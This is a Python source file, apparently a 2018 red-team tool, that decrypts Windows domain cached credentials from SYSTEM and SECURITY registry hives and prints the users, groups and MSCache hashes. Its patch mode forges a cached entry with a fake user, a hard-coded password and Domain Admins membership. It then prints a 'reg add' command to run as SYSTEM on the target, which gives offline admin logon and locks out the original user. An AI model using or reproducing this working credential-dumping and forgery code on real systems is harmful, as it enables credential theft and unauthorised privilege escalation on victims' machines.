# encoding: utf-8
# author: n1nty @ 360 A-TEAM
# date: 2018-08-21
'''
A small tool to play around with windows domain cached credentials, mainly based on the work of mimikatz and impacket 
'''

from impacket.examples.secretsdump import NL_RECORD, LocalOperations, LSASecrets
from struct import unpack, pack
from Crypto.Cipher import AES
import hashlib
import hmac
from passlib.hash import msdcc2
import ntpath
from datetime import datetime

def take(s, sz, skip=-1):
    v = s[:sz]
    skip = sz if skip == -1 else skip
    return s[skip:], v

def pad(data):
    if (data & 0x3) > 0:
        return data + (data & 0x3)
    else:
        return data

# implementation of kull_m_crypto_aesCTSEncrypt from mimikatz
def decrypt(cipher, key, iv):
    szData = len(cipher)
    aes = AES.new(key, AES.MODE_CBC, iv)

    nbBlock = (szData + 15) >> 4
    lastLen = (szData & 0xf) if (szData & 0xf) else 16

    # 不解密 cipher 的最后两组
    plaintext = aes.decrypt(cipher[:16 * (nbBlock - 2)])

    # buffer 包含最后没解密的两组
    buffer = cipher[16 * (nbBlock -2):]
    padding_count = 32 - len(buffer)

    # 将 buffer padding 至 32 位
    buffer += padding_count * '\x00'
    buffer = list(buffer)

    aes_noiv = AES.new(key, AES.MODE_CBC, IV='\x00'*16)

    # 解密 buffer 第 1 组
    tmp = aes_noiv.decrypt(''.join(buffer[:16]))

    for i in range(16):
        buffer[i] = chr(ord(tmp[i]) ^ ord(buffer[i+16]))

    #buffer[lastLen + 16: lastLen + 16 + 16 - lastLen] = buffer[lastLen: lastLen + 16 - lastLen]
    buffer[lastLen + 16: 32] = buffer[lastLen: 16]

    a = ''.join(buffer[16:])
    plaintext += aes.decrypt(a)
    plaintext += ''.join(buffer[:lastLen])

    return plaintext
        # &buffer[7 + 16], &buffer[7], 16 - 7

# implementation of kull_m_crypto_aesCTSEncrypt from mimikatz
def encrypt(plaintext, key, iv):
    szData = len(plaintext)
    nbBlock = (szData + 15) >> 4
    lastLen = (szData & 0xf) if (szData & 0xf) else 16

    aes = AES.new(key, AES.MODE_CBC, iv)

    # 不加密最后两组
    cipher = aes.encrypt(plaintext[:16 * (nbBlock - 2)])

    buffer = plaintext[16 * (nbBlock -2):]
    padding_count = 32 - len(buffer)

    # 将 buffer padding 至 32 位
    buffer += padding_count * '\x00'
    buffer = aes.encrypt(buffer)

    cipher += buffer[16:32]
    cipher += buffer[:lastLen]

    return cipher



def filetime_to_dt(ft):
    EPOCH_AS_FILETIME = 116444736000000000  # January 1, 1970 as MS file time
    HUNDREDS_OF_NANOSECONDS = 10000000

    return datetime.utcfromtimestamp((ft - EPOCH_AS_FILETIME) / HUNDREDS_OF_NANOSECONDS)

class Group(object):
    def __init__(self, relative_id, attributes):
        self.relative_id = relative_id
        self.attributes = attributes

    def encode(self):
        return pack('<LL', self.relative_id, self.attributes)

    def __str__(self):
        return {
            512: '512<Domain Admins>',
            513: '513<Domain Users>',
            519: '519<Enterprise Admins>'
        }.get(self.relative_id, str(self.relative_id))


class EncData(object):

    def __init__(self, nl, nklm, valuename):
        self.valuename = valuename
        self._nl = nl
        self._nklm = nklm

        #self._data = data = CryptoCommon().decryptAES(nklm[16:32], nl['EncryptedData'], nl['IV'])
        self._data = data = decrypt(nl['EncryptedData'], nklm[16:32], nl['IV'])

        data, self.mshashdata = take(data, 16)
        data, self.unkhash = take(data, 16)
        data, self.unk0 = take(data, 4)
        data, self.szSC = take(data, 4)
        data, self.unkLength = take(data, 4)
        data, self.unk2 = take(data, 4)
        data, self.unk3 = take(data, 4)
        data, self.unk4 = take(data, 4)
        data, self.unk5 = take(data, 4)
        data, self.unk6 = take(data, 4)
        data, self.unk7 = take(data, 4)
        data, self.unk8 = take(data, 4)

        data, self.username = take(data, nl['UserLength'], pad(nl['UserLength']))
        self.username = self.username.decode('utf-16le')

        data, self.domain = take(data, nl['DomainNameLength'], pad(nl['DomainNameLength']))
        self.domain = self.domain.decode('utf-16le')

        data, self.dns_domainname = take(data, nl['DnsDomainNameLength'], pad(nl['DnsDomainNameLength']))
        self.dns_domainname = self.dns_domainname.decode('utf-16le')

        data, self.upn = take(data, nl['UPN'], pad(nl['UPN']))
        self.upn = self.upn.decode('utf-16le')

        data, self.effective_name = take(data, nl['EffectiveNameLength'], pad(nl['EffectiveNameLength']))
        self.effective_name = self.effective_name.decode('utf-16le')

        data, self.fullname = take(data, nl['FullNameLength'], pad(nl['FullNameLength']))
        self.fullname = self.fullname.decode('utf-16le')

        data, self.logonscript_name = take(data, nl['LogonScriptName'], pad(nl['LogonScriptName']))
        self.logonscript_name = self.logonscript_name.decode('utf-16le')

        data, self.profilepath = take(data, nl['ProfilePathLength'], pad(nl['ProfilePathLength']))
        self.profilepath = self.profilepath.decode('utf-16le')

        data, self.home = take(data, nl['HomeDirectoryLength'], pad(nl['HomeDirectoryLength']))
        self.home = self.home.decode('utf-16le')

        data, self.home_drive = take(data, nl['HomeDirectoryDriveLength'], pad(nl['HomeDirectoryDriveLength']))
        self.home_drive = self.home_drive.decode('utf-16le')

        self.groups = []
        for i in range(self._nl['GroupCount']):
            data, rid = take(data, 4, pad(4))
            rid = unpack('<I', rid)[0]
            data, attributes = take(data, 4, pad(4))
            attributes = unpack('<I', attributes)[0]

            # print  rid, attributes
            self.groups += [Group(rid, attributes)]


        data, self.logon_domainname = take(data, nl['logonDomainNameLength'], pad(nl['logonDomainNameLength']))
        self.logon_domainname = self.logon_domainname.decode('utf-16le')


        self.unk_rest = data


    def is_domainadmin(self):
        for group in self.groups:
            if group.relative_id == 512:
                return True


    def add_group(self, relative_id, attributes=7):
        self.groups.append(Group(relative_id,attributes))


    def format(self):
        ss = u'''# reg query "HKEY_LOCAL_MACHINE\SECURITY\Cache" /v "{valuename}"
# {lastwrite}
        username: {username} <{UPN}>
        domain groups: {groups}
        mscache hash: {hash}
        domain: {domain}, {dns domain name}
        effective name: {effective name}
        full name: {full name}
        logon script: {logon script}
        profile path: {profile path}
        home: {home}
        home drive: {home drive}
        checksum: {checksum}
        IV: {IV}
        '''.format(**{
            'valuename': self.valuename,
            'username': self.username,
            'lastwrite':filetime_to_dt(self._nl['LastWrite']),
            'groups': ', '.join(map(str, self.groups)),
            'hash': self.mshashdata.encode('hex'),
            'domain': self.domain,
            'dns domain name': self.dns_domainname,
            'UPN': self.upn,
            'effective name': self.effective_name,
            'full name': self.fullname,
            'logon script': self.logonscript_name,
            'profile path': self.profilepath,
            'home': self.home,
            'home drive': self.home_drive,
            'checksum': self._nl['CH'].encode('hex'),
            'IV': self._nl['IV'].encode('hex')
        })
        return ss


    def setpassword(self, password):
        hash = msdcc2.hash(password, self.username)
        self.mshashdata = hash.decode('hex')

    def encode(self):
        d = ''

        for v in [self.mshashdata, self.unkhash, self.unk0, self.szSC, self.unkLength,
                  self.unk2, self.unk3, self.unk4, self.unk5, self.unk6, self.unk7, self.unk8]:
            v, l = self.pack_pad(v, unicodestr=False)
            d += v

        for v, lengthField in zip([
                  self.username, self.domain, self.dns_domainname, self.upn, self.effective_name,
                  self.fullname, self.logonscript_name, self.profilepath, self.home, self.home_drive],
                    [
                        'UserLength', 'DomainNameLength', 'DnsDomainNameLength', 'UPN', 'EffectiveNameLength',
                        'FullNameLength', 'LogonScriptName', 'ProfilePathLength', 'HomeDirectoryLength', 'HomeDirectoryDriveLength'
                    ]):
            v, l = self.pack_pad(v)
            self._nl[lengthField] = l
            d += v

        self._nl['GroupCount'] = len(self.groups)
        for group in self.groups:
            d += group.encode()

        v, l = self.pack_pad(self.logon_domainname)
        d += v
        self._nl['logonDomainNameLength'] = l

        d += self.unk_rest

        return d

    def dump(self):
        encoded = self.encode()
        self._nl['CH'] = self.sign(encoded)
        self._nl['EncryptedData'] = encrypt(encoded, self._nklm[16:32], self._nl['IV'])
        return self._nl.getData()

    def sign(self, data):
        return hmac.new(self._nklm[16:32], data, hashlib.sha1).digest()[:16]

    def pack(self):
        pass

    def pack_pad(self, d, unicodestr=True):
        d = d.encode('utf-16le') if unicodestr else d
        l = len(d)
        d += '\x00' * (pad(len(d)) - len(d))
        return d, l



class Secrets(LSASecrets):

    def __init__(self, security_hive, bootkey):
        LSASecrets.__init__(self, security_hive, bootkey)
        self.credentials = []

    def prepare(self):
        # Let's first see if there are cached entries

        if not self.credentials:
            values = self.enumValues('\\Cache')
            if values is None:
                print 'no cached credentials'
                return

            try:
                # Remove unnecessary value
                values.remove('NL$Control')
            except:
                pass

            self._LSASecrets__getLSASecretKey()
            self._LSASecrets__getNLKMSecret()

            for value in values:
                nl = NL_RECORD(self.getValue(ntpath.join('\\Cache', value))[1])
                if nl['IV'] != '\x00' *16:
                    en = EncData(nl, self._LSASecrets__NKLMKey, value)
                    self.credentials.append(en)

    def dump(self):
        self.prepare()
        print 'dumping domain cached credentials'
        for cre in self.credentials:
            print cre.format()

    def patch(self, user):
        self.prepare()

        for cre in self.credentials:
            if cre.username == user:
                cre.logon_domainname = 'FAKE'
                cre.domain = 'FAKE'
                cre.dns_domainname = 'FAKE.COM'

                uname = 'fakeuser'
                cre.username = uname
                cre.upn = cre.username + '@' + cre.dns_domainname.lower() if cre.dns_domainname else cre.upn.split('@')[1]
                cre.effective_name = uname
                # cre._nl['UserId'] = 6666

                password = 'n1nty@360 A-TEAM'
                cre.setpassword(password)

                if not cre.is_domainadmin():
                    cre.add_group(relative_id=512)


                print '''execute as SYSTEM on target: 
    reg add "HKEY_LOCAL_MACHINE\SECURITY\Cache" /v "{nl}" /t REG_BINARY /d {binary} /f

user being patched:
    {patched_user}
    * this user will no longer be able to logon when there is no contact with DC. When there is, this user can logon without problems

logon information:
    username: {domain}\{username}
    password: {password}
    * you can logon with credential above when there is !!!no contact with DC!!!. When there is, you can't do that
                '''.format(patched_user=user, domain=cre.domain, username=cre.username, password=password, nl=cre.valuename, binary=cre.dump().encode('hex'))

                break

        else:
            print 'not able to patch, there is no cached credential for', user
            print

            self.dump()


if __name__ == '__main__':
    from optparse import OptionParser
    parser = OptionParser(usage='''
    A small tool by n1nty @ 360 A-TEAM to play around with windows domain cached credentials, mainly based on the work of mimikatz and impacket
    Works for post-Vista systems.
    
    {script} --system <system file> --security <security file>
        dump domain cached credentials
        
    {script} --system <system file> --security <security file> --patch <username>
        patch credentials for <username>
    '''.format(script=__file__))

    parser.add_option('--system', dest='system', help='path to the system file')
    parser.add_option('--security', dest='security', help='path to the security file')
    parser.add_option('--patch', dest='patch', help='the user to patch')



    (options, args) = parser.parse_args()

    if not options.security or not options.system:
        parser.print_help()
        exit()

    localOperations = LocalOperations(options.system)
    bootKey = localOperations.getBootKey()

    secrets = Secrets(options.security, bootKey)


    if options.patch:
        secrets.patch(options.patch)
    else:
        secrets.dump()
        #
        # lst1 = [secrets.credentials[0].unk_rest] * len(secrets.credentials)
        # lst2 = [cre.unk_rest for cre in secrets.credentials]
        #
        # print lst1 == lst2

